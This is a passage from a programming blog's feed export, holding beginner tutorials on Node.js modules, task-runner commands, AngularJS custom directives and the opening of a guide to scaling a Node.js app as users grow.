<p>Try the following case with <code>exports</code> and then with <code>module.exports</code>.</p>
<figure class="highlight javascript"><figcaption><span>main.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Cat = <span class="built_in">require</span>(<span class="string">'./cat'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> Cat();</span><br><span class="line"><span class="built_in">console</span>.log(cat.makeSound());</span><br></pre></td></tr></table></figure>
<p>To sum up, when to use <code>module.exports</code> vs <code>exports</code>:</p>
<p>Use <code>exports</code> to:</p>
<ul>
<li>Export named function. e.g. <code>exports.area</code>, <code>exports.circunference</code>.</li>
</ul>
<p>Use <code>module.exports</code> to:</p>
<ol>
<li><p>If you want to export an object, class, function at the root level (e.g. <code>module.exports = Cat</code>)</p>
</li>
<li><p>If you prefer to return a single object that exposes multiple assignments. e.g.<code>module.exports = {area, circumference};</code></p>
</li>
</ol>
<h1 id="Imports">Imports<a href="#Imports" class="headerlink" title="Imports"></a></h1><p>Starting with version 8.5.0+, Node.js supports ES modules natively with a feature flag and new file extention <code>*.mjs</code>.</p>
<p>For instace, our previous <code>circle.js</code> can be rewritten as <code>circle.mjs</code> as follows:</p>
<figure class="highlight javascript"><figcaption><span>cirle.mjs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PI = <span class="number">3.14159265359</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">radius</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (radius ** <span class="number">2</span>) * PI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">circumference</span>(<span class="params">radius</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * radius * PI;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Then, we can use import:</p>
<figure class="highlight javascript"><figcaption><span>main.mjs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; area, circumference &#125; <span class="keyword">from</span> <span class="string">'./circle.mjs'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> r = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Circle with radius <span class="subst">$&#123;r&#125;</span> has</span></span><br><span class="line"><span class="string">  area: <span class="subst">$&#123;area(r)&#125;</span>;</span></span><br><span class="line"><span class="string">  circunference: <span class="subst">$&#123;circumference(r)&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>
<p>And, finally you can run it using the experimental module feature flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node --experimental-modules main.mjs</span><br></pre></td></tr></table></figure>
<p>If you don‚Äôt like experimental modules, another alternative is to use a transpiler. That converts modern JavaScript to older versions for you. Good options are
<a href="https://www.typescriptlang.org/docs/handbook/modules.html" target="_blank" rel="noopener">TypeScript</a>,
<a href="https://babeljs.io/docs/en/babel-plugin-transform-modules-commonjs" target="_blank" rel="noopener">Babel</a>, and
<a href="https://rollupjs.org/guide/en#importing" target="_blank" rel="noopener">Rollup</a>.</p>
<h1 id="Summary">Summary<a href="#Summary" class="headerlink" title="Summary"></a></h1><p>We learned about how to create Node.js modules and used it in our code.  Modules allow us to reuse code easily. They provide functionality that is isolated from other modules. The <code>require</code> function is used to load modules. The <code>exports</code> and <code>module.exports</code> allow us to define what parts of our code we want to expose. We also explored the difference between <code>module.exports</code> and <code>exports</code>. Finally, we took a quick pick about what‚Äôs coming up for modules using <code>imports</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Getting started with Node.js modules: require, exports, imports and beyond.&lt;/p&gt;
&lt;p&gt;Modules are a crucial concept to understand Node.js projects. In this post, we cover Node modules: &lt;code&gt;require&lt;/code&gt;, &lt;code&gt;exports&lt;/code&gt; and, the future &lt;code&gt;import&lt;/code&gt;.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Programming/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="NodeJS" scheme="https://adrianmejia.com/tags/NodeJS/"/>
    
  </entry>
  
  <entry>
    <title>List tasks in NPM, Yarn, Grunt, Gulp and Rake</title>
    <link href="https://adrianmejia.com/blog/2016/06/25/List-tasks-in-npm-grunt-gulp-and-rake/"/>
    <id>https://adrianmejia.com/blog/2016/06/25/List-tasks-in-npm-grunt-gulp-and-rake/</id>
    <published>2016-06-25T19:14:49.000Z</published>
    <updated>2019-02-21T23:21:03.326Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm run</span><br><span class="line">yarn run</span><br><span class="line">grunt --<span class="built_in">help</span></span><br><span class="line">gulp --tasks</span><br><span class="line">rake --tasks</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Programming/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="gruntjs" scheme="https://adrianmejia.com/tags/gruntjs/"/>
    
      <category term="gulpjs" scheme="https://adrianmejia.com/tags/gulpjs/"/>
    
  </entry>
  
  <entry>
    <title>Creating custom AngularJS directives for beginners</title>
    <link href="https://adrianmejia.com/blog/2016/04/08/creating-custom-angularjs-directives-for-beginners/"/>
    <id>https://adrianmejia.com/blog/2016/04/08/creating-custom-angularjs-directives-for-beginners/</id>
    <published>2016-04-08T20:41:32.000Z</published>
    <updated>2016-04-08T20:41:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>Directives are one of the most important concepts to understand Angular. This tutorial takes through the basics and beyond. We will cover how to build your own HTML extensions through directives.</p>
<a id="more"></a>
<p>Angular framework relies heavily on them to teach the browser new HTML tags. Directives are a powerful tool to create reusable web components. Directives not only could be defined as new HTML tags but also as attributes, CSS classes or even HTML comments. Angular comes with many built-in (core) directives that offer numerous functionalities to your web applications right away. Furthermore, it also allows us to define our own through custom directives. We are going to focus on the later.</p>
<p>Let‚Äôs say we want to create a new HTML component that the browsers doesn‚Äôt support yet, like a To-do list:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">my-todo</span> <span class="attr">list</span>=<span class="string">"todo"</span> <span class="attr">title</span>=<span class="string">"Angular Todo"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-todo</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>If you paste that code in any browser, it will not do much. We need to use Angular to teach the browser how to interpret this new HTML element called ‚Äúmy-todo‚Äù. We do this by defining a new directive with its attributes.</p>
<p>Let‚Äôs initialize our app and define our new directive:</p>
<p>Create a new file called ‚Äúscript.js‚Äù</p>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = angular.module(<span class="string">'myApp'</span>, []);</span><br><span class="line"></span><br><span class="line">app.directive(<span class="string">'myTodo'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      restrict: <span class="string">'EA'</span>,</span><br><span class="line">      templateUrl: <span class="string">'todo.tpl.html'</span>,</span><br><span class="line">      scope: &#123;</span><br><span class="line">        list: <span class="string">'='</span>,</span><br><span class="line">        title: <span class="string">'@'</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<p>Don‚Äôt get scared if you don‚Äôt understand what‚Äôs going on right now. By the end of this tutorial, you will be able to know what each line is doing.</p>
<p>In the first line, we initialize an angular module called ‚ÄúmyApp‚Äù.  That will return an ‚Äúapp‚Äù instance where we can start defining our Angular app.</p>
<p>We start by adding a directive called ‚ÄúmyTodo‚Äù, notice that is different from ‚Äúmy-todo‚Äù that we used in the HTML code above. That‚Äôs because, by convention in HTML, tags names words are separated by a hyphen like ‚Äúmy-todo‚Äù. On the other hand, in Angular they match the same element with words joint together and capitalizing the beginning of each word, except the first one ‚ÄúmyTodo‚Äù. This style of joining words is known as ‚ÄúcamelCase‚Äù.</p>
<p>You will notice that a directive, takes a name ‚ÄúmyTodo‚Äù and function. The later returns an object with a number of attributes depending on what we would like to accomplish.  In our case, we have three attributes: restrict, templateUrl, and scope. Let‚Äôs explain each one in that exact order.</p>
<h1 id="Restrict">Restrict<a href="#Restrict" class="headerlink" title="Restrict"></a></h1><p>The ‚Äúrestrict‚Äù attribute tells Angular, with one letter, how are we going to create our new directive. It can take four different values ‚ÄòE‚Äô, ‚ÄòA‚Äô, ‚ÄòC‚Äô, ‚ÄòM‚Äô or combination of them like ‚ÄòEA‚Äô. Each one has it‚Äôs own meaning:</p>
<table>
<thead>
<tr>
<th>Restrict</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>E</td>
<td>Implies we are going to use our directive as a new HTML element.</td>
<td><code>&lt;my-todo list=&quot;todo&quot; title=&quot;Element&quot;&gt; &lt;/my-todo&gt;</code></td>
</tr>
<tr>
<td>A</td>
<td>Means that our directive is going to take over any HTML element that has an attribute that matches our directive name.</td>
<td><code>&lt;div my-todo list=&quot;todo&quot; title=&quot;Attr&quot;&gt; &lt;/div&gt;</code></td>
</tr>
<tr>
<td>C</td>
<td>Indicates that our directive will be found in CSS classes.</td>
<td><code>&lt;div class=&quot;my-todo&quot; list=&quot;todo&quot; title=&quot;Class&quot;&gt; &lt;/div&gt;</code></td>
</tr>
<tr>
<td>M</td>
<td>Matches HTML comments.</td>
<td><code>&lt;!--directive:my-todo attributes goes here--&gt;</code></td>
</tr>
</tbody>
</table>
<p>Taking our To-do example, with the combined value ‚ÄòEA‚Äô, means that will match any element with our directive as an attribute, and also, it will match any element defined as ‚Äú<my-todo>‚Äù</my-todo></p>
<p>It is a good practice only to use restrict to either ‚ÄòE‚Äô or ‚ÄòA‚Äô or both. Classes ‚ÄòC‚Äô and comments ‚ÄòM‚Äô could be easily misinterpreted. That‚Äôs why we are using just EA.</p>
<h1 id="Template">Template<a href="#Template" class="headerlink" title="Template"></a></h1><p>Templates are just HTML code that could be reuse multiple times with different values or text. In order to be generic enough, they use placeholders tied to variables that could be easily replaced. Let‚Äôs create the ‚Äútodo.tpl.html‚Äù with the following content:</p>
<figure class="highlight html"><figcaption><span>todo.tpl.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-repeat</span>=<span class="string">"todo in list"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">ng-model</span>=<span class="string">"todo.completed"</span>&gt;</span> &#123;&#123;todo.name&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Notice that our template contains placeholders with a variable such as Creating custom AngularJS directives for beginners, which is going, to be replaced by real title text. Similarly,  is going to be replaced with a task name.</p>
<p>We just used our first built-in Angular directive, in this tutorial, ‚Äúng-repeat‚Äù. This directive is going to take an array of elements, like our list and repeat itself for each one of elements and refer to them as ‚Äútodo‚Äù. In other words, if the list contains 4 tasks, we are going to see 4 checkboxes each one with the name of the individual tasks. We are going to explain where ‚Äútitle‚Äù and ‚Äúlist‚Äù comes in the next section.</p>
<p>Going back to our directive definition, we could have used ‚Äútemplate‚Äù attribute instead of ‚ÄútemplateUrl‚Äù and take inline html code directly, but often is hard to read and we would prefer to use ‚ÄútemplateUrl‚Äù and defined as a separated file.</p>
<p>As you might figure it out, ‚ÄútemplateUrl‚Äù takes the name of the file containing the template. If all templates and code are in the same directory just the name of the file will do. If they are in a different folder you will need to specify the full path to reach it. To keep it simple, we are going to have all files in a single directory.</p>
<h1 id="Scope">Scope<a href="#Scope" class="headerlink" title="Scope"></a></h1><p>Scopes are key concept to understand Angular. Scope is what glues JavaScript code with HTML and allow us to replace placeholders from templates with real values.</p>
<p>In our directive definition, we are creating a new ‚Äúisolated scope‚Äù with two elements:</p>
<figure class="highlight javascript"><figcaption><span>Isolated scope</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scope: &#123;</span><br><span class="line">  list: <span class="string">'='</span>,</span><br><span class="line">  title: <span class="string">'@'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If you remember from our template, these are exactly the two placeholders that we had ‚Äútitle‚Äù and ‚Äúlist‚Äù. The symbols = and @ looks a little mysterious but they are not too cryptic once we know what they mean.</p>
<ul>
<li><code>@</code> Implies that the value of the attribute with the same name in the HTML element will be passed as a string. For instance, <my-todo title="The Directive"></my-todo>, will replace Creating custom AngularJS directives for beginners in our template for ‚ÄúThe Directive‚Äù.</li>
<li><code>=</code> Binds to the value of the expression and to the literal value. This means that if we have an attribute list=‚Äútodo‚Äù and ‚Äútodo‚Äù is equal to 5, then it will be replaced to 5 and not to the literal text ‚Äútodo‚Äù. In our case, ‚Äútodo‚Äù is going to be an array of tasks.</li>
</ul>
<p>Bear in mind, that in Angular we can have multiple scopes. So, our directives could be influenced by outer scopes. For instance, another scope could define ‚Äútodo‚Äù as an array of elements. Here is where we introduce another important concept: controllers.</p>
<h1 id="Controllers">Controllers<a href="#Controllers" class="headerlink" title="Controllers"></a></h1><p>The main purpose of controllers is to set initial values the scope and also add behavior through functions. We are going to use a controller to define the ‚Äútodo‚Äù list that we want to render with our newly created directive.</p>
<p>The way we create controllers is by attaching the controller to our Angular app instance. Let‚Äôs go back to script.js and append the following:</p>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.controller(<span class="string">'main'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>)</span>&#123;</span><br><span class="line">  $scope.todo = [</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">'Create a custom directive'</span>, <span class="attr">completed</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">'Learn about restrict'</span>, <span class="attr">completed</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">'Master scopes'</span>, <span class="attr">completed</span>: <span class="literal">false</span>&#125;</span><br><span class="line">  ];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>Noticed that we defined our controller with the name ‚Äúmain‚Äù and pass along a function with the ‚Äú$scope‚Äù parameter. This is important since, whatever we attach to the ‚Äú$scope‚Äù variable it will become available in templates and other directives. We just defined our todo list as an array of objects with two properties name and completed.</p>
<h1 id="To-do-directive">To-do directive<a href="#To-do-directive" class="headerlink" title="To-do directive"></a></h1><p>So far, we have been preparing the grounds for our directive. We have created:</p>
<ul>
<li>‚ÄúmyApp‚Äù module</li>
<li>‚ÄúmyTodo‚Äù directive</li>
<li>‚Äútodo.tpl.html‚Äù template</li>
<li>‚Äúmain‚Äù controller</li>
</ul>
<p>Now, is the time to put everything together and make it work!</p>
<p>Let‚Äôs create an index.html page with the following:</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">data-require</span>=<span class="string">"angular.js@1.5.0"</span> <span class="attr">data-semver</span>=<span class="string">"1.5.0"</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/angularjs/1.5.0/angular.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"script.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">ng-app</span>=<span class="string">"myApp"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-controller</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">my-todo</span> <span class="attr">list</span>=<span class="string">"todo"</span> <span class="attr">title</span>=<span class="string">"Angular To-do"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-todo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>We add the AngularJS library first and then initialize the app using the built-in directive ‚Äúng-app‚Äù. Notice that this must match to module that we created ‚ÄúmyApp‚Äù or it won‚Äôt work.</p>
<p>Later, we reference our controller using another core directive called ‚Äúng-controller‚Äù. Similarly to ng-app, it also takes a value that should match the one we defined, in this case ‚Äúmain‚Äù controller.  This main controller defines our ‚Äútodo‚Äù as an array of tasks with names and whether they have been completed or not.</p>
<p>Finally, we start using our new directive! It takes two attributes the title and a list. If you remember, we defined a template inside the directive definition, so it knows how to render the content.</p>
<p>That‚Äôs all you need to make it work. Now try it!</p>
<iframe style="width: 100%; height: 400px;" src="//embed.plnkr.co/7ZDRclRJaJyTtRBKjIa3/" frameborder="0" allowfullscren="allowfullscren"></iframe>


<h1 id="Next-steps">Next steps<a href="#Next-steps" class="headerlink" title="Next steps"></a></h1><p>By now you should be looking at our new To-do list. We can reuse this new directive with new to-do lists as many times as we want. Just passing different values to ‚Äúlist‚Äù in our ‚Äúmy-todo‚Äù the browser will be able to render it for us. We can also define another controller with a different $scope.todo and our directive will respond accordantly.</p>
<p>We just walked through the main attributes to create directives and discuss how to use them. We learnt how to isolate the scope of our directive and just allow certain parameters into our templates such as ‚Äúlist‚Äù and ‚Äútitle‚Äù. Also, used the ‚Äúrestrict‚Äù attribute to allow our directive be created either as a new HTML element or as an attribute. Finally, we explore how to use templates and bind it with our scope variables.</p>
<h2 id="Related-Posts">Related Posts<a href="#Related-Posts" class="headerlink" title="Related Posts"></a></h2><ul>
<li><a href="/blog/2014/09/28/angularjs-tutorial-for-beginners-with-nodejs-expressjs-and-mongodb/">AngularJS Tutorial for Beginners</a></li>
<li><a href="/blog/2014/10/03/mean-stack-tutorial-mongodb-expressjs-angularjs-nodejs/">Angular and Node tutorial</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Directives are one of the most important concepts to understand Angular. This tutorial takes through the basics and beyond. We will cover how to build your own HTML extensions through directives.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Technologies/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="angularjs" scheme="https://adrianmejia.com/tags/angularjs/"/>
    
      <category term="angular 1.x" scheme="https://adrianmejia.com/tags/angular-1-x/"/>
    
  </entry>
  
  <entry>
    <title>How to scale a Nodejs app based on number of users</title>
    <link href="https://adrianmejia.com/blog/2016/03/23/how-to-scale-a-nodejs-app-based-on-number-of-users/"/>
    <id>https://adrianmejia.com/blog/2016/03/23/how-to-scale-a-nodejs-app-based-on-number-of-users/</id>
    <published>2016-03-23T21:34:11.000Z</published>
    <updated>2016-03-23T21:34:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>Massive success is the best that could happen to any application. But, it could be a blessing and a curse for developers. Dealing with downtime, high availability and trying to scale. The following is a guideline on how to scale the web applications as the number of users grows.</p>
<a id="more"></a>
<p>One of the most dreaded questions is: ‚ÄòWould that scale?‚Äô. The following is a guideline on how to grow the web applications as the number of users grows. Scaling an application too early is more painful than beneficial. This guide provides a way how to start simple and scale as the number of users grows.</p>
<p><strong>Common Server Setups For Scaling Your Web Application</strong></p>
<p>The examples and solutions will be as practical as possible. We might use references to Amazon Web Services (AWS), Digital Ocean or other cloud solutions. Also, there are some NodeJS/Nginx references, but they could easily be translated to other technologies.</p>
<p>You may notice, that the measurement we are using is ‚Äúconcurrent user‚Äù, which means all users are hitting the web app at the same time. It‚Äôs different from the number of users supported (which might be higher) since it‚Äôs unlikely that all users are hitting the app at the same time. However, we are going to use ‚Äúconcurrent user‚Äù since it‚Äôs easier to explain.</p>
<h1 id="Local-host-1-concurrent-users">Local host (1 concurrent users)<a href="#Local-host-1-concurrent-users" class="headerlink" title="Local host (1 concurrent users)"></a></h1><p>You are the only one using your app on your localhost.</p>
<p>There is no need to worry about scale.</p>
<h1 id="Single-Server-2-9-concurrent-users">Single Server (2 - 9 concurrent users)<a href="#Single-Server-2-9-concurrent-users" class="headerlink" title="Single Server (2 - 9 concurrent users)"></a></h1><p>You deployed your app to the wild! üëèüèª You and your colleges (and maybe close friends) are the only users so far.</p>
<p>Everything is great on a single server as long as you are using a web server that uses an event model like Nginx. NodeJS by nature uses an event-driven and non-blocking I/O model. It means that it won‚Äôt block with a single request, rather it will handle all the request and reply as data from database or services comes available in a callback/promise. Your Node app will spend most of the time waiting for the database or file system to respond. In the meantime, it can take multiple requests.</p>
<p>Your app should be a monolith (single app) right now, and it‚Äôs fine. No need to complicate your life for just a few users yet.If people are reporting bugs, unfortunately, as you make changes, you will need to take it down the app while updating the server. Using AWS t2.micro/t2.nano or equivalent (1 CPU/ 1 GB RAM) will do.</p>
<img src="/images/10_users.png" title="Single Server Setup">
<p>The ‚ÄúSingle Server Setup‚Äù is the simplest. Web application and database share the same resources (CPU, Memory RAM, I/O).</p>
<h1 id="Vertical-Scaling-10-99-concurrent-users">Vertical Scaling (10 - 99 concurrent users)<a href="#Vertical-Scaling-10-99-concurrent-users" class="headerlink" title="Vertical Scaling (10 - 99 concurrent users)"></a></h1><p>You decided to talk about your app in your social networks üëçüèª. Your friends from Facebook and other social network start clicking the link to your web app at once and you are getting around 100 users.</p>
<p>Requests might start to take longer, and things start to become slower. You need a bigger box! This is called <strong>vertical scaling</strong>. Vertical scale means upgrading a single server hardware with more resources such as higher/faster CPU, RAM, HDD, and I/O.</p>
<p>If you are using AWS, you might upgrade to a t2.medium or equivalent (2 CPU / 4 GB RAM). An additional benefit of having multi CPU cores. We can run two instances of your NodeJS and load balance it with Nginx. Multiple instances of your app mean that you could achieve zero-downtime deployment/updates. You can upgrade one server while the other keeps serving the requests. For example, take down server #1, while server #2 continues serving the request. Then, bring up server #1 and take down server #2 to update it. In the end, no request will be dropped, and your app is fully updated.</p>
<img src="/images/100_users.png" title="Scaling a Single Server">
<p>This setup has several improvements over the previous one:</p>
<ul>
<li>Nginx takes care of users requests and accomplish two functions: static filers server and reverse proxy. It serve by itself all static files (CSS, JS, Images) without touching the web app. The request that needs the app to resolve are redirected it, this is called reverse proxy.</li>
<li>Zero-downtime upgrades.</li>
</ul>
<h1 id="Horizontal-Scaling-100-999-concurrent-users">Horizontal Scaling (100 - 999 concurrent users)<a href="#Horizontal-Scaling-100-999-concurrent-users" class="headerlink" title="Horizontal Scaling (100 - 999 concurrent users)"></a></h1><p>Looks like the hard work has paid off and your app continue growing to around 1,000 users! üôåüèª</p>
<p>After some time, the app is becoming slow again. Probably, the bottleneck is on the I/O. Database is taking longer to respond. We could keep upgrading to m4.xlarge or equivalent (4 CPU / 16 GB RAM). 4 CPU means that you could have also have multiple instances of the database/app. This is called <strong>horizontal scaling</strong>.</p>
<p>There is a point where vertical scaling is not cost/effective anymore especially. For instance, on look at this comparison and prices from Digital Ocean:</p>
<img src="/images/vertical_vs_horizontal_scaling.png" title="Vertical vs Horizontal Scaling">
<p>On AWS will a little bit more wider the price range: $37.44/mo vs $172.08/mo.</p>
<p>Vertical scaling has another issue: all your eggs are in one basket. If the server goes down, you‚Äôre screwed! On the other hand, horizontal scaling will give you redundancy and failover capabilities if done right.</p>
<p>At this point, it‚Äôs better to start scaling horizontally rather than vertically. The bottleneck is most likely on the database. So, we can:</p>
<ul>
<li>Move the database to a different server and scale it independently</li>
<li>Add replica set if the database hits its limit and db caching if it makes sense.</li>
</ul>
<p>Since the Node is very efficient, it will spend most of the time waiting for the database to return data. So, the main limitation will be dictated by the network limits. You might need to play also with <code>/etc/security/limits.d</code> and <code>/etc/sysctl.conf</code> based on your needs. For instance the maximum number of requests queued are determined by <code>net.core.somaxconn</code>, which defaults to 128. Change it to <code>1024</code> so we can meet the 100 - 999 range of users. From now on, let‚Äôs handle 1000 users per application server.</p>
<h1 id="Multi-servers-1-000-concurrent-users">Multi-servers (1,000+ concurrent users)<a href="#Multi-servers-1-000-concurrent-users" class="headerlink" title="Multi-servers (1,000+ concurrent users)"></a></h1><p>The app keeps growing and now we need to prepare to support around 10k users!</p>
<p>We can improve our previous setup, as follows:</p>
<ul>
<li>Add load balancer (e.g. ELB) and add app units.</li>
<li>Use multiple availability zones (AZ) in a region (e.g. us-east-1, us-west-1), which one are connected through low latency links.</li>
<li>Split static files to different server/service for easier maintenance. (e.g. AWS S3 and CloudFront CDN). Add CDN for static files for optimizing cross-origin performance and lower the latency. You can store assets such as Javascript, CSS, images, videos, and so on.</li>
</ul>
<p>Using Elastic Load Balancer (ELB) with Route 53 is Amazon AWS specific, but there are similar solutions for other clouds providers. ELB is a load balancer managed by AWS and is available in all existing AZ. ELB has health checks so it won‚Äôt route to a failing host. It also can manage around 1000s instances.</p>
<img src="/images/10k_users.png" title="Horizontal Scaling">
<p>In this server setup, we started growing horizontally rather than vertically. In other words, we separated web application from database and scale each one with multiple instances. There are several advantages of having the database in a different server than the app:</p>
<ul>
<li>Application and database doesn‚Äôt fight for the same resources.</li>
<li>We can scale each tier (app, db) independently to as many as we need.</li>
</ul>
<p>The cons is that getting this setup is more complicated. Furthermore, since app and db are not in the same server performance issues might arise due to network latency or bandwidth limits. It maximize performance, it‚Äôs recommended to use private networks with low latency and high speed links.</p>
<h1 id="Microservices-100-000-concurrent-users">Microservices (100,000+ concurrent users)<a href="#Microservices-100-000-concurrent-users" class="headerlink" title="Microservices (100,000+ concurrent users)"></a></h1><p>This is it! We need to plan the infrastructure to allow us to grow to infinity! ‚àû</p>
<p>So far, we have been leveraging vertical and horizontal scaling, we have separated web apps from databases instances, and deploy them to multiple regions. However, we have been a single code based that handles all the work in our application. We can break it down into smaller pieces and scale them as needed. Going from monolith to microservices.</p>
<p>It‚Äôs time to take down our web app monolith and break it down into multiple smaller and independent components (microservices/SOA) that we can scale independently. We don‚Äôt have to do the break down all at once. We can have the monolith keep doing what it was doing and start writing small client apps performs some of the task that the main app used to do. Later, we can use the load balancer to redirect the traffic to the new small service instead of the main app. Eventually, we can remove the code from the monolith since the new microservice has fully replaced it. Repeat this process as many time as needed to create new microservices. It should looks something like this:</p>
